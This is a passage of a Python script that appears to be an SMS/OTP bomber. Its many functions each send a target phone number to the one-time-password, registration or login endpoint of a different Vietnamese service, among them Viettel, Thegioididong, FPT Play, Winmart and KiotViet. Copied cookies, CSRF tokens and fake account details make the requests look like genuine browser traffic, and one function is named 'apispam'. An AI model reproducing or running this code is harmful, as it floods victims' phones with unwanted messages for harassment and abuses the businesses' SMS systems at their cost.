        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
###
def a42(phone):
    cookies = {
        'DMX_Personal': '%7B%22UID%22%3A%2202a2125eae4752c091831644559197e73c7d03c7%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8OWsBjKS6DlGsrtmU_sYztKa6jv4_yE6DtGOKVnXzsN6QtnTcJHOshhJAjy60o2M8G7nlhVDVpVJq5TrlHeeRcwJjejgiIZpN-iBvlNqnf1tRwxng2G6uuWHF9XpCpNPf5yKVSW_11B4iUgzW4n4SgE',
        '_gid': 'GA1.2.2106570071.1685151972',
        '_ga_TLRZMSX5ME': 'GS1.1.1685151972.1.0.1685151972.60.0.0',
        '_ga': 'GA1.1.2004811826.1685151972',
        '_fbp': 'fb.1.1685151972814.1550382232',
        'cebs': '1',
        '_ce.s': 'v~23af4964fee97034df50d8ac200f8c95b4ea3899~lcw~1685151972938~vpv~0~lcw~1685151972940',
        '_ce.clock_event': '1',
        'SvID': 'beline2686|ZHFg6|ZHFg5',
        '_ce.clock_data': '-113%2C14.225.211.123%2C1',
        'cebsp_': '1',
        '_tt_enable_cookie': '1',
        '_ttp': '5MoF_IoMgcKATLRi4lIvjOVPQrd',
        'lhc_per': 'vid|eadd7b088636140f774e',
    }

    headers = {
        'authority': 'www.thegioididong.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'DMX_Personal=%7B%22UID%22%3A%2202a2125eae4752c091831644559197e73c7d03c7%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8OWsBjKS6DlGsrtmU_sYztKa6jv4_yE6DtGOKVnXzsN6QtnTcJHOshhJAjy60o2M8G7nlhVDVpVJq5TrlHeeRcwJjejgiIZpN-iBvlNqnf1tRwxng2G6uuWHF9XpCpNPf5yKVSW_11B4iUgzW4n4SgE; _gid=GA1.2.2106570071.1685151972; _ga_TLRZMSX5ME=GS1.1.1685151972.1.0.1685151972.60.0.0; _ga=GA1.1.2004811826.1685151972; _fbp=fb.1.1685151972814.1550382232; cebs=1; _ce.s=v~23af4964fee97034df50d8ac200f8c95b4ea3899~lcw~1685151972938~vpv~0~lcw~1685151972940; _ce.clock_event=1; SvID=beline2686|ZHFg6|ZHFg5; _ce.clock_data=-113%2C14.225.211.123%2C1; cebsp_=1; _tt_enable_cookie=1; _ttp=5MoF_IoMgcKATLRi4lIvjOVPQrd; lhc_per=vid|eadd7b088636140f774e',
        'origin': 'https://www.thegioididong.com',
        'referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8OWsBjKS6DlGsrtmU_sYztIFV_sLQ8iWp7L2ZHjo3-UAquJc6mF7IflJ21rflzBVCTfkVYuNcBYuDIdaZroeLkecOCkjg8RcsK0QvNDv6_w7iP7JTCGaGgWZ4Ybwep7Zt6N6vP8-qJcVUHhSPvjvh_s',
    }

    response = requests.post(
        'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )
###

def a43(phone):
    cookies = {
        '_gid': 'GA1.2.1019704199.1688123462',
        '_gat_UA-214880719-1': '1',
        '_ga_RRJDDZGPYG': 'GS1.1.1688123461.1.1.1688123540.56.0.0',
        '_ga': 'GA1.1.313940094.1688123462',
        '_ga_7ZDGMGYGRG': 'GS1.2.1688123462.1.1.1688123540.0.0.0',
    }

    headers = {
        'authority': 'api.dongplus.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_gid=GA1.2.1019704199.1688123462; _gat_UA-214880719-1=1; _ga_RRJDDZGPYG=GS1.1.1688123461.1.1.1688123540.56.0.0; _ga=GA1.1.313940094.1688123462; _ga_7ZDGMGYGRG=GS1.2.1688123462.1.1.1688123540.0.0.0',
        'origin': 'https://dongplus.vn',
        'referer': 'https://dongplus.vn/user/login',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post(
        'https://api.dongplus.vn/api/user/send-one-time-password',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"phone":"84972936627"}'
    #response = requests.post('https://api.dongplus.vn/api/user/send-one-time-password', cookies=cookies, headers=headers, data=data)
def vayvnd(phone):
  data = '{"phone":"phone","utm":[{"utm_source":"google","utm_medium":"organic","referrer":"https://www.google.com/"}],"sourceSite":3}'.replace("phone",phone)
  head = {
    "Host":"api.vayvnd.vn",
    "accept":"application/json",
    "accept-language":"vi-VN",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "site-id":"3",
    "content-type":"application/json; charset=utf-8",
    "origin":"https://vayvnd.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vayvnd.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.vayvnd.vn/v2/users",data=data,headers=head).json()
def tamo(phone):
  data = '{"mobilePhone":{"number":"phone"}}'.replace("phone",phone)
  head = {
    "Host":"api.tamo.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json;charset=UTF-8",
    "origin":"https://www.tamo.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://www.tamo.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts",data=data,headers=head).json()

def meta(phone):
  data = '{"api_args":{"lgUser":"phone","act":"send","type":"phone"},"api_method":"CheckExist"}'.replace("phone",phone)
  head = {
    "Host":"meta.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "origin":"https://meta.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-origin",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://meta.vn/account/register",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.post("https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1",data=data,headers=head).text
def fpt(phone):
	requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
def fptplay(sdt):
    Headers = {"Host": "api.fptplay.net","content-length": "89","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json; charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://fptplay.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptplay.vn/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phone": sdt,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
    response = requests.post("https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st\u003dEim9hpobCZPoIoVVokkIDA\u0026e\u003d1681802671\u0026device\u003dChrome(version%253A112.0.0.0)\u0026drm\u003d1", data=Datason, headers=Headers).json()
def alfrescos(phone):
  data = '{"phoneNumber":"phone","secureHash":"33f65da1c264ef7f519149065a600def","deviceId":"","sendTime":1691068424578,"type":2}'.replace("phone",phone)
  head = {
    "Host":"api.alfrescos.com.vn",
    "accept":"application/json, text/plain, */*",
    "brandcode":"ALFRESCOS",
    "devicecode":"web",
    "accept-language":"vi-VN",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "origin":"https://alfrescos.com.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://alfrescos.com.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN",data=data,headers=head).json()
def poyeye(phone):
  data= '{"phone":"phone","firstName":"Nguyen","lastName":"Hoang","email":"Khgf123@gmail.com","password":"1262007gdtg"}'
  data = data.replace("phone",phone)
  head = {
    "Host":"api.popeyes.vn",
    "accept":"application/json",
    "x-client":"WebApp",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://popeyes.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.popeyes.vn/api/v1/register",data=data, headers=head).json()
def sms3(phone):
  data = f'phone_number={phone}&password=1262007Gdtg&given_name=&device_id=688e6ab3da160a362df3805047548504&platform=mobile_web&model=Android%208.1.0&push_token=&device_name=Chrome%2F114&device_type=desktop&isMorePlatform=true&ui=012021'
  head = {
    "Host":"api.vieon.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/x-www-form-urlencoded",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vieon.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021",data=data,headers=head).json()
def vieon(phone):
  data = f'phone_number={phone}&password=1262007Gdtg&given_name=&device_id=688e6ab3da160a362df3805047548504&platform=mobile_web&model=Android%208.1.0&push_token=&device_name=Chrome%2F114&device_type=desktop&isMorePlatform=true&ui=012021'
  head = {
    "Host":"api.vieon.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/x-www-form-urlencoded",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vieon.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021",data=data,headers=head).json()
def tv360(phone):
  head = {
    "Host":"m.tv360.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
  }
  data = '{"msisdn":"phone"}'
  data = data.replace("phone",phone)
  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
def smsapi(phone):
  head = {
    "Host":"api-crownx.winmart.vn",
    "accept":"application/json",
    "authorization":"Bearer undefined",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://winmart.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}",headers=head).json()
def winmart(phone):
  head = {
    "Host":"api-crownx.winmart.vn",
    "accept":"application/json",
    "authorization":"Bearer undefined",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://winmart.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}",headers=head).json()
def fptplay(phone):
    Headers = {"Host": "api.fptplay.net","content-length": "89","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json; charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://fptplay.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptplay.vn/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phone": phone,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
    response = requests.post("https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st\u003dEim9hpobCZPoIoVVokkIDA\u0026e\u003d1681802671\u0026device\u003dChrome(version%253A112.0.0.0)\u0026drm\u003d1", data=Datason, headers=Headers).json()
def funring(phone):
  data ='{"username": "phone"}'.replace("phone",phone)
  head = {
    "Host":"funring.vn",
    "Connection":"keep-alive",
    "Accept":"*/*",
    "User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "Content-Type":"application/json",
    "X-Requested-With":"mark.via.gp",
    "Accept-Encoding":"gzip, deflate",
    "Accept-Language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
  }
  rq = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp",data=data,headers=head).json()
def apispam(phone):
  cookies = {
        '_gcl_au': '1.1.309447918.1692615536',
    '_gid': 'GA1.2.1715264339.1692615536',
    '_gac_UA-187725374-2': '1.1692615536.EAIaIQobChMI0KW8m8ztgAMVya6WCh14FgSjEAAYAiAAEgK3RfD_BwE',
    '_hjSessionUser_2281843': 'eyJpZCI6IjQ3MjdhZmU2LTUwZTUtNTI1Yi1hMDM0LWE5NmYyODM2NTlkMCIsImNyZWF0ZWQiOjE2OTI2MTU1MzYyNzksImV4aXN0aW5nIjpmYWxzZX0=',
    '_hjFirstSeen': '1',
    '_hjIncludedInSessionSample_2281843': '0',
    '_hjSession_2281843': 'eyJpZCI6IjVjYjA5NmVlLTEyOTMtNDI1NS04MjNiLTk2OTA2YWVhNzdmZCIsImNyZWF0ZWQiOjE2OTI2MTU1MzYyOTQsImluU2FtcGxlIjpmYWxzZX0=',
    '_hjAbsoluteSessionInProgress': '0',
    '_fbp': 'fb.1.1692615536318.2070074030',
    '_ga_K15C064VTW': 'GS1.2.1692615536.1.0.1692615536.60.0.0',
    '_tt_enable_cookie': '1',
    '_ttp': 'w06Lg8BcCLaKDJGog5p2fh4MR__',
    '_fw_crm_v': '624460c4-e99a-4505-8671-6775f481f4e3',
    '_hjIncludedInSessionSample_2281853': '0',
    '_hjSession_2281853': 'eyJpZCI6ImQ5MzQ2ZjY5LTk1MjMtNDM3NC1hMDljLTgxNjYxMjhlMjExNCIsImNyZWF0ZWQiOjE2OTI2MTU1NDYxOTIsImluU2FtcGxlIjpmYWxzZX0=',
    '_hjSessionUser_2281853': 'eyJpZCI6Ijg1OTg1NmVhLTI4YWEtNTVlZS1hN2Q4LTJlNTA4YWFhNWNhYSIsImNyZWF0ZWQiOjE2OTI2MTU1NDU0ODUsImV4aXN0aW5nIjp0cnVlfQ==',
    '_ga_ZBQ18M247M': 'GS1.1.1692615536.1.1.1692615613.50.0.0',
    '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDkxNTMzMTkwMA.WaEQZqkAYaDmYZm52clJNLAi739p2FnvP4Lg8yE8CNk',
    '_gcl_aw': 'GCL.1692615615.EAIaIQobChMI0KW8m8ztgAMVya6WCh14FgSjEAAYAiAAEgK3RfD_BwE',
    '_gat_UA-187725374-1': '1',
    '_ga_ZN0EBP68G5': 'GS1.1.1692615545.1.1.1692615614.60.0.0',
    '_ga': 'GA1.2.114114010.1692615536',
    '_gac_UA-187725374-1': '1.1692615616.EAIaIQobChMI0KW8m8ztgAMVya6WCh14FgSjEAAYAiAAEgK3RfD_BwE',
    '_ga_03H0F9NHEX': 'GS1.2.1692615545.1.1.1692615615.60.0.0',
    }
  headers = {
        'authority': 'lk.takomo.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://lk.takomo.vn',
    'referer': 'https://lk.takomo.vn/?phone={phone}&amount=10000000&term=30&utm_source=google_search&utm_medium=ThanhBinh-TKM&utm_campaign=google_search_cpc_VH_All_ThanhBinh_2&utm_term=google_search_cpc_VH_All_ThanhBinh_NationalWide_Massive_2_1&utm_content=google_search_cpc_VH_All_ThanhBinh_NationalWide_Massive_TKM___2_1_1&gad=1&gclid=EAIaIQobChMI0KW8m8ztgAMVya6WCh14FgSjEAAYAiAAEgK3RfD_BwE',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}
  json_data = {
    
        'phone': phone,
        'code': 'resend',
        'channel': 'ivr',
    

}

  response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers, json=json_data)
def kiot(phone):
    cookies = {
        'AKA_A2': 'A',
        'gkvas-uuid': 'b1b6bfdd-724e-449f-8acc-f3594f1aae3f',
        'gkvas-uuid-d': '1687347271111',
        'kvas-uuid': '1fdbe87b-fe8b-4cd5-b065-0900b3db04b6',
        'kvas-uuid-d': '1687347276471',
        'kv-session': '52268693-9db7-4b7d-ab00-0f5022612bc5',
        'kv-session-d': '1687347276474',
        '_fbp': 'fb.1.1687347277057.810313564',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_563959': '1',
        '_hjSession_563959': 'eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==',
        '_hjAbsoluteSessionInProgress': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'idt42AWvO5FQ_0j25HtJ7BSoA7J',
        '_gid': 'GA1.2.1225607496.1687347277',
        '_hjSessionUser_563959': 'eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==',
        '_ga_6HE3N545ZW': 'GS1.1.1687347278.1.1.1687347282.56.0.0',
        '_ga_N9QLKLC70S': 'GS1.2.1687347283.1.1.1687347283.0.0.0',
        '_fw_crm_v': '4c8714f2-5161-4721-c213-fe417c49ae65',
        'parent': '65',
        '_ga': 'GA1.2.1568204857.1687347277',
    }

    headers = {
        'authority': 'www.kiotviet.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'AKA_A2=A; gkvas-uuid=b1b6bfdd-724e-449f-8acc-f3594f1aae3f; gkvas-uuid-d=1687347271111; kvas-uuid=1fdbe87b-fe8b-4cd5-b065-0900b3db04b6; kvas-uuid-d=1687347276471; kv-session=52268693-9db7-4b7d-ab00-0f5022612bc5; kv-session-d=1687347276474; _fbp=fb.1.1687347277057.810313564; _hjFirstSeen=1; _hjIncludedInSessionSample_563959=1; _hjSession_563959=eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=1; _tt_enable_cookie=1; _ttp=idt42AWvO5FQ_0j25HtJ7BSoA7J; _gid=GA1.2.1225607496.1687347277; _hjSessionUser_563959=eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==; _ga_6HE3N545ZW=GS1.1.1687347278.1.1.1687347282.56.0.0; _ga_N9QLKLC70S=GS1.2.1687347283.1.1.1687347283.0.0.0; _fw_crm_v=4c8714f2-5161-4721-c213-fe417c49ae65; parent=65; _ga=GA1.2.1568204857.1687347277',
        'origin': 'https://www.kiotviet.vn',
        'referer': 'https://www.kiotviet.vn/dang-ky/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': '+84'+phone[1:],
        'code': 'bancainayne',
        'name': 'Cai Nit',
        'email': 'ahihi123982@gmail.com',
        'zone': 'An Giang - Huyện Châu Phú',
        'merchant': 'bancainayne',
        'username': phone,
        'industry': 'Điện thoại & Điện máy',
        'ref_code': '',
        'industry_id': '65',
        'phone_input': "phone",
    }

    response = requests.post(
        'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',
        cookies=cookies,
        headers=headers,
        data=data,
    ).text
def vietid(phone):
